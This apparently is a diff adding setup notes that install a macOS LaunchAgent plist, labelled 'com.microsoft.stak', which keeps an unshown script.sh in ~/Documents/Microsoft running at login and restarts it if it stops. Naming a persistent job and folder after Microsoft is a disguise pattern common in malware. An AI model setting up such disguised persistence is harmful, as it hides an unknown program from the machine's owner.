@@ -1,0 +1,44 @@
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
+
+DOWNLOAD FILES TO COMPUTER
+
+COPY ‘Microsoft/bin’ to DOCUMENTS
+
+EDIT ‘script.sh’ to direct to correct user path
+
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
+
+Create folder:
+~/Library/LaunchAgents/
+
+DUPLICATE ANY FILE IN DOCUMENTS AND REPLACE TEXT WITH
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+ <key>Label</key>
+ <string>com.microsoft.stak</string>
+ <key>RunAtLoad</key>
+ <true/>
+<key>KeepAlive</key>
+<true/>
+<key>ProgramArguments</key>
+    <array>
+       <string>/bin/sh</string>
+       <string>~/Documents/Microsoft/script.sh</string>
+    </array>
+</dict>
+</plist>
+
+NAME FILE com.microsoft.stak.plist
+
+MAKE SURE TO CHANGE THE PATH in ProgramArguments
+
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
+
+launchctl load ~/Library/LaunchAgents/com.microsoft.stak.plist
+
+launchctl start com.microsoft.stak
+
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
